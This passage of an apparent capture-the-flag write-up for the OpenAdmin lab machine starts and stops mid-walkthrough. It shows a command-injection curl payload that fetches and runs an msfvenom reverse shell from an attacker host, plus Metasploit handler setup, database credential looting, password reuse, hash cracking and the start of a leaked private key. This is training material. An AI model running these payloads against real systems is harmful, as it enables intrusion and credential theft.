</span></span><span class=line><span class=cl> curl --silent -d <span class=s2>&#34;xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo \&#34;BEGIN\&#34;;</span><span class=si>${</span><span class=nv>cmd</span><span class=si>}</span><span class=s2>;echo \&#34;END\&#34;&amp;xajaxargs[]=ping&#34;</span> <span class=s2>&#34;</span><span class=si>${</span><span class=nv>URL</span><span class=si>}</span><span class=s2>&#34;</span> <span class=p>|</span> sed -n -e <span class=s1>&#39;/BEGIN/,/END/ p&#39;</span> <span class=p>|</span> tail -n +2 <span class=p>|</span> head -n -1
</span></span><span class=line><span class=cl><span class=k>done</span>
</span></span></code></pre></td></tr></table></div></div><p>So to upload an execute my reverse shell I tried:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>curl --silent -d <span class=s2>&#34;xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo \&#34;BEGIN\&#34;;wget http://10.10.15.151:443/80.bin; chmod +x 80.bin; ./80.bin ;echo \&#34;END\&#34;&amp;xajaxargs[]=ping&#34;</span> <span class=s2>&#34;http://10.10.10.171/ona/login.php&#34;</span> <span class=p>|</span> sed -n -e <span class=s1>&#39;/BEGIN/,/END/ p&#39;</span> <span class=p>|</span> tail -n +2 <span class=p>|</span> head -n -1
</span></span></code></pre></td></tr></table></div></div><p>The shell wasn&rsquo;t executed because we can&rsquo;t <code>chmod +x</code> for whatever reason.</p><p>So I tried a trick to execute the shell:
<code>/lib64/ld-linux-x86-64.so.2 /opt/ona/www/80.bin</code> but it didn&rsquo;t work.</p><p>I found a quite useful article <a href=https://www.networkworld.com/article/3002286/what-can-you-do-when-you-cant-chmod-chmod.html>What can you do when you can&rsquo;t chmod chmod?</a>
were I learned about a command to copy the permissions of a binary.</p><p>So I used <code>getfacl</code> and <code>setfacl</code> to copy permissions from another binary.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>getfacl /bin/ls | setfacl --set-file=- 80.bin
</span></span></code></pre></td></tr></table></div></div><p>It seems Meterpreter has an upstream bug with shell.</p><p>So in short here what I did to get my reverse shell:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Attacker
</span></span><span class=line><span class=cl>msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.15.151 LPORT=80 -f elf &gt; 80.bin
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># Target
</span></span><span class=line><span class=cl>wget http://10.10.15.151:443/80.bin
</span></span><span class=line><span class=cl>getfacl /bin/ls | setfacl --set-file=- 80.bin
</span></span><span class=line><span class=cl>./80.bin
</span></span></code></pre></td></tr></table></div></div><p>Listener + PTY:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>msf5</span> <span class=o>&gt;</span> <span class=n>use</span> <span class=n>exploit</span><span class=o>/</span><span class=n>multi</span><span class=o>/</span><span class=n>handler</span>
</span></span><span class=line><span class=cl><span class=n>msf5</span> <span class=n>exploit</span><span class=p>(</span><span class=n>multi</span><span class=o>/</span><span class=n>handler</span><span class=p>)</span> <span class=o>&gt;</span> <span class=n>set</span> <span class=n>payload</span> <span class=n>linux</span><span class=o>/</span><span class=n>x64</span><span class=o>/</span><span class=n>shell_reverse_tcp</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=&gt;</span> <span class=n>linux</span><span class=o>/</span><span class=n>x64</span><span class=o>/</span><span class=n>shell_reverse_tcp</span>
</span></span><span class=line><span class=cl><span class=n>msf5</span> <span class=n>exploit</span><span class=p>(</span><span class=n>multi</span><span class=o>/</span><span class=n>handler</span><span class=p>)</span> <span class=o>&gt;</span> <span class=n>set</span> <span class=n>LPORT</span> <span class=mi>80</span>
</span></span><span class=line><span class=cl><span class=n>LPORT</span> <span class=o>=&gt;</span> <span class=mi>80</span>
</span></span><span class=line><span class=cl><span class=n>msf5</span> <span class=n>exploit</span><span class=p>(</span><span class=n>multi</span><span class=o>/</span><span class=n>handler</span><span class=p>)</span> <span class=o>&gt;</span> <span class=n>set</span> <span class=n>LHOST</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>15.151</span>
</span></span><span class=line><span class=cl><span class=n>LHOST</span> <span class=o>=&gt;</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>15.151</span>
</span></span><span class=line><span class=cl><span class=n>msf5</span> <span class=n>exploit</span><span class=p>(</span><span class=n>multi</span><span class=o>/</span><span class=n>handler</span><span class=p>)</span> <span class=o>&gt;</span> <span class=n>run</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>python3</span> <span class=o>-</span><span class=n>c</span> <span class=s1>&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span></code></pre></td></tr></table></div></div><p>Now we can use the interactive mysql client with the credentials we looted
earlier:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>www-data@openadmin:/opt/ona/www$ mysql -u ona_sys -p
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>mysql&gt; show tables;
</span></span><span class=line><span class=cl>show tables;
</span></span><span class=line><span class=cl>+------------------------+
</span></span><span class=line><span class=cl>| Tables_in_ona_default  |
</span></span><span class=line><span class=cl>+------------------------+
</span></span><span class=line><span class=cl>| blocks                 |
</span></span><span class=line><span class=cl>| configuration_types    |
</span></span><span class=line><span class=cl>| configurations         |
</span></span><span class=line><span class=cl>| custom_attribute_types |
</span></span><span class=line><span class=cl>| custom_attributes      |
</span></span><span class=line><span class=cl>| dcm_module_list        |
</span></span><span class=line><span class=cl>| device_types           |
</span></span><span class=line><span class=cl>| devices                |
</span></span><span class=line><span class=cl>| dhcp_failover_groups   |
</span></span><span class=line><span class=cl>| dhcp_option_entries    |
</span></span><span class=line><span class=cl>| dhcp_options           |
</span></span><span class=line><span class=cl>| dhcp_pools             |
</span></span><span class=line><span class=cl>| dhcp_server_subnets    |
</span></span><span class=line><span class=cl>| dns                    |
</span></span><span class=line><span class=cl>| dns_server_domains     |
</span></span><span class=line><span class=cl>| dns_views              |
</span></span><span class=line><span class=cl>| domains                |
</span></span><span class=line><span class=cl>| group_assignments      |
</span></span><span class=line><span class=cl>| groups                 |
</span></span><span class=line><span class=cl>| host_roles             |
</span></span><span class=line><span class=cl>| hosts                  |
</span></span><span class=line><span class=cl>| interface_clusters     |
</span></span><span class=line><span class=cl>| interfaces             |
</span></span><span class=line><span class=cl>| locations              |
</span></span><span class=line><span class=cl>| manufacturers          |
</span></span><span class=line><span class=cl>| messages               |
</span></span><span class=line><span class=cl>| models                 |
</span></span><span class=line><span class=cl>| ona_logs               |
</span></span><span class=line><span class=cl>| permission_assignments |
</span></span><span class=line><span class=cl>| permissions            |
</span></span><span class=line><span class=cl>| roles                  |
</span></span><span class=line><span class=cl>| sequences              |
</span></span><span class=line><span class=cl>| sessions               |
</span></span><span class=line><span class=cl>| subnet_types           |
</span></span><span class=line><span class=cl>| subnets                |
</span></span><span class=line><span class=cl>| sys_config             |
</span></span><span class=line><span class=cl>| tags                   |
</span></span><span class=line><span class=cl>| users                  |
</span></span><span class=line><span class=cl>| vlan_campuses          |
</span></span><span class=line><span class=cl>| vlans                  |
</span></span><span class=line><span class=cl>+------------------------+
</span></span><span class=line><span class=cl>40 rows in set (0.00 sec)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>mysql&gt; select * from users;
</span></span><span class=line><span class=cl>select * from users;
</span></span><span class=line><span class=cl>+----+----------+----------------------------------+-------+---------------------+---------------------+
</span></span><span class=line><span class=cl>| id | username | password                         | level | ctime               | atime               |
</span></span><span class=line><span class=cl>+----+----------+----------------------------------+-------+---------------------+---------------------+
</span></span><span class=line><span class=cl>|  1 | guest    | 098f6bcd4621d373cade4e832627b4f6 |     0 | 2020-03-13 15:46:03 | 2020-03-13 15:46:03 |
</span></span><span class=line><span class=cl>|  2 | admin    | 21232f297a57a5a743894a0e4a801fc3 |     0 | 2020-03-13 15:45:04 | 2020-03-13 15:45:04 |
</span></span><span class=line><span class=cl>+----+----------+----------------------------------+-------+---------------------+---------------------+
</span></span><span class=line><span class=cl>2 rows in set (0.00 sec)
</span></span></code></pre></td></tr></table></div></div><p>All of that was nearly useless because the password hash of the admin user is
the md5 of <code>admin</code> so we could have guessed it pretty easily.</p><p>With <code>ss -nlp</code> let list open sockets:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>tcp  LISTEN 0      80                                     127.0.0.1:3306                                            0.0.0.0:*
</span></span><span class=line><span class=cl>tcp  LISTEN 0      128                                    127.0.0.1:52846                                           0.0.0.0:*
</span></span><span class=line><span class=cl>tcp  LISTEN 0      128                                127.0.0.53%lo:53                                              0.0.0.0:*
</span></span><span class=line><span class=cl>tcp  LISTEN 0      128                                      0.0.0.0:22                                              0.0.0.0:*
</span></span><span class=line><span class=cl>tcp  LISTEN 14     128                                            *:80                                                    *:*
</span></span><span class=line><span class=cl>tcp  LISTEN 0      128                                         [::]:22                                                 [::]:*
</span></span></code></pre></td></tr></table></div></div><p>We can see the public web server listening on all interfaces on port 80, the SSH
server, the internally exposed database on port 3306, but what&rsquo;s running on port
52846? Seems it&rsquo;s a web server.</p><p>The body looks like this:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl>   <span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>h2</span><span class=p>&gt;</span>Enter Username and Password<span class=p>&lt;/</span><span class=nt>h2</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>div</span> <span class=na>class </span><span class=o>=</span> <span class=s>&#34;container form-signin&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=p>&lt;</span><span class=nt>h2</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;featurette-heading&#34;</span><span class=p>&gt;</span>Login Restricted.<span class=p>&lt;</span><span class=nt>span</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;text-muted&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>span</span><span class=p>&gt;&lt;/</span><span class=nt>h2</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>                <span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span> <span class=c>&lt;!-- /container --&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>div</span> <span class=na>class </span><span class=o>=</span> <span class=s>&#34;container&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>         <span class=p>&lt;</span><span class=nt>form</span> <span class=na>class </span><span class=o>=</span> <span class=s>&#34;form-signin&#34;</span> <span class=na>role </span><span class=o>=</span> <span class=s>&#34;form&#34;</span>
</span></span><span class=line><span class=cl>            <span class=na>action </span><span class=o>=</span> <span class=s>&#34;/index.php&#34;</span> <span class=na>method </span><span class=o>=</span> <span class=s>&#34;post&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>            <span class=p>&lt;</span><span class=nt>h4</span> <span class=na>class </span><span class=o>=</span> <span class=s>&#34;form-signin-heading&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>h4</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>            <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type </span><span class=o>=</span> <span class=s>&#34;text&#34;</span> <span class=na>class </span><span class=o>=</span> <span class=s>&#34;form-control&#34;</span>
</span></span><span class=line><span class=cl>               <span class=na>name </span><span class=o>=</span> <span class=s>&#34;username&#34;</span>
</span></span><span class=line><span class=cl>               <span class=na>required</span> <span class=na>autofocus</span><span class=p>&gt;&lt;/</span><span class=nt>br</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>            <span class=p>&lt;</span><span class=nt>input</span> <span class=na>type </span><span class=o>=</span> <span class=s>&#34;password&#34;</span> <span class=na>class </span><span class=o>=</span> <span class=s>&#34;form-control&#34;</span>
</span></span><span class=line><span class=cl>               <span class=na>name </span><span class=o>=</span> <span class=s>&#34;password&#34;</span> <span class=na>required</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>            <span class=p>&lt;</span><span class=nt>button</span> <span class=na>class </span><span class=o>=</span> <span class=s>&#34;btn btn-lg btn-primary btn-block&#34;</span> <span class=na>type </span><span class=o>=</span> <span class=s>&#34;submit&#34;</span>
</span></span><span class=line><span class=cl>               <span class=na>name </span><span class=o>=</span> <span class=s>&#34;login&#34;</span><span class=p>&gt;</span>Login<span class=p>&lt;/</span><span class=nt>button</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>         <span class=p>&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      <span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   <span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>There is a login page on 127.0.0.1:52846, let&rsquo;s try to login with the creds we
found on the database.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>curl -X POST http://127.0.0.1:52846/index.php --data &#39;username=admin&amp;password=admin&amp;login=Submit&#39;
</span></span></code></pre></td></tr></table></div></div><p>I obtain a <code>Wrong username or password.</code> :(</p><p>But if take a look at the owner of the internal website, it seems it&rsquo;s jimmy:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=err>@</span><span class=n>openadmin</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>$</span> <span class=n>ls</span> <span class=o>-</span><span class=n>lh</span>
</span></span><span class=line><span class=cl><span class=n>ls</span> <span class=o>-</span><span class=n>lh</span>
</span></span><span class=line><span class=cl><span class=n>total</span> <span class=mf>8.0</span><span class=n>K</span>
</span></span><span class=line><span class=cl><span class=n>drwxr</span><span class=o>-</span><span class=n>xr</span><span class=o>-</span><span class=n>x</span> <span class=mi>6</span> <span class=n>www</span><span class=o>-</span><span class=n>data</span> <span class=n>www</span><span class=o>-</span><span class=n>data</span> <span class=mf>4.0</span><span class=n>K</span> <span class=n>Nov</span> <span class=mi>22</span> <span class=mi>15</span><span class=p>:</span><span class=mi>59</span> <span class=n>html</span>
</span></span><span class=line><span class=cl><span class=n>drwxrwx</span><span class=o>---</span> <span class=mi>2</span> <span class=n>jimmy</span>    <span class=n>internal</span> <span class=mf>4.0</span><span class=n>K</span> <span class=n>Mar</span> <span class=mi>13</span> <span class=mi>15</span><span class=p>:</span><span class=mi>53</span> <span class=n>internal</span>
</span></span><span class=line><span class=cl><span class=n>lrwxrwxrwx</span> <span class=mi>1</span> <span class=n>www</span><span class=o>-</span><span class=n>data</span> <span class=n>www</span><span class=o>-</span><span class=n>data</span>   <span class=mi>12</span> <span class=n>Nov</span> <span class=mi>21</span> <span class=mi>16</span><span class=p>:</span><span class=mi>07</span> <span class=n>ona</span> <span class=o>-&gt;</span> <span class=o>/</span><span class=n>opt</span><span class=o>/</span><span class=n>ona</span><span class=o>/</span><span class=n>www</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=system-privilege-escalation--www-data-to-jimmy>System Privilege Escalation : www-data to jimmy<a hidden class=anchor aria-hidden=true href=#system-privilege-escalation--www-data-to-jimmy>#</a></h3><p><strong>TL;DR</strong>: credential stuffing</p><p>It could be helpful to read the source code but with <code>www-data</code> we are not in
the internal group so we need to connect as jimmy to read the source code.</p><p>A big guessing step involved here: we needed to re-use the MySQL <code>ona_sys</code> user
password (<code>n1nj4W4rri0R!</code>) as jimmy PAM password for ssh.
I think the idea was credentials stuffing if jimmy is the dev of the internal
web app he may have reused his own personal password for dev purpose like the
DB.</p><p>Now cen can connect and look at the source code:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>ssh</span> <span class=n>jimmy</span><span class=err>@</span><span class=mf>10.10</span><span class=o>.</span><span class=mf>10.171</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>jimmy</span><span class=err>@</span><span class=n>openadmin</span><span class=p>:</span><span class=o>~$</span> <span class=n>ls</span> <span class=o>-</span><span class=n>la</span> <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>internal</span><span class=o>/</span>
</span></span><span class=line><span class=cl><span class=n>total</span> <span class=mi>20</span>
</span></span><span class=line><span class=cl><span class=n>drwxrwx</span><span class=o>---</span> <span class=mi>2</span> <span class=n>jimmy</span> <span class=n>internal</span> <span class=mi>4096</span> <span class=n>Mar</span> <span class=mi>13</span> <span class=mi>15</span><span class=p>:</span><span class=mi>53</span> <span class=o>.</span>
</span></span><span class=line><span class=cl><span class=n>drwxr</span><span class=o>-</span><span class=n>xr</span><span class=o>-</span><span class=n>x</span> <span class=mi>4</span> <span class=n>root</span>  <span class=n>root</span>     <span class=mi>4096</span> <span class=n>Nov</span> <span class=mi>22</span> <span class=mi>18</span><span class=p>:</span><span class=mi>15</span> <span class=o>..</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=n>rwxrwxr</span><span class=o>-</span><span class=n>x</span> <span class=mi>1</span> <span class=n>jimmy</span> <span class=n>internal</span> <span class=mi>3229</span> <span class=n>Nov</span> <span class=mi>22</span> <span class=mi>23</span><span class=p>:</span><span class=mi>24</span> <span class=n>index</span><span class=o>.</span><span class=n>php</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=n>rwxrwxr</span><span class=o>-</span><span class=n>x</span> <span class=mi>1</span> <span class=n>jimmy</span> <span class=n>internal</span>  <span class=mi>185</span> <span class=n>Nov</span> <span class=mi>23</span> <span class=mi>16</span><span class=p>:</span><span class=mi>37</span> <span class=n>logout</span><span class=o>.</span><span class=n>php</span>
</span></span><span class=line><span class=cl><span class=n>lrwxrwxrwx</span> <span class=mi>1</span> <span class=n>jimmy</span> <span class=n>jimmy</span>      <span class=mi>17</span> <span class=n>Mar</span> <span class=mi>13</span> <span class=mi>15</span><span class=p>:</span><span class=mi>53</span> <span class=n>lol</span> <span class=o>-&gt;</span> <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span><span class=o>/</span><span class=n>lol</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=n>rwxrwxr</span><span class=o>-</span><span class=n>x</span> <span class=mi>1</span> <span class=n>jimmy</span> <span class=n>internal</span>  <span class=mi>339</span> <span class=n>Nov</span> <span class=mi>23</span> <span class=mi>17</span><span class=p>:</span><span class=mi>40</span> <span class=n>main</span><span class=o>.</span><span class=n>php</span>
</span></span></code></pre></td></tr></table></div></div><p>In <code>index.php</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>            <span class=nv>$msg</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;login&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>              <span class=k>if</span> <span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;jimmy&#39;</span> <span class=o>&amp;&amp;</span> <span class=nx>hash</span><span class=p>(</span><span class=s1>&#39;sha512&#39;</span><span class=p>,</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>])</span> <span class=o>==</span> <span class=s1>&#39;00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                  <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;jimmy&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                  <span class=nx>header</span><span class=p>(</span><span class=s2>&#34;Location: /main.php&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>              <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                  <span class=nv>$msg</span> <span class=o>=</span> <span class=s1>&#39;Wrong username or password.&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>              <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>         <span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>The password of jimmy (for the internal web app) is hardcoded and we can break
the SHA512 with an online service for example.</p><p><code>00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1</code> -> <code>Revealed</code></p><p>So we can connect as jimmy and be redirected to <code>main.php</code> (<code>header("Location: /main.php");</code>).</p><h3 id=system-privilege-escalation--jimmy-to-joanna>System Privilege Escalation : jimmy to joanna<a hidden class=anchor aria-hidden=true href=#system-privilege-escalation--jimmy-to-joanna>#</a></h3><p><strong>TL;DR</strong>: password crack</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ curl -X POST http://127.0.0.1:52846/index.php --data &#39;username=jimmy&amp;password=Revealed&amp;login=Submit&#39;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ curl -X POST http://127.0.0.1:52846/main.php
</span></span><span class=line><span class=cl>&lt;pre&gt;-----BEGIN RSA PRIVATE KEY-----
</span></span><span class=line><span class=cl>Proc-Type: 4,ENCRYPTED
</span></span><span class=line><span class=cl>DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
</span></span><span class=line><span class=cl>ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
</span></span><span class=line><span class=cl>ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
</span></span><span class=line><span class=cl>6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
</span></span><span class=line><span class=cl>ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
</span></span><span class=line><span class=cl>y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
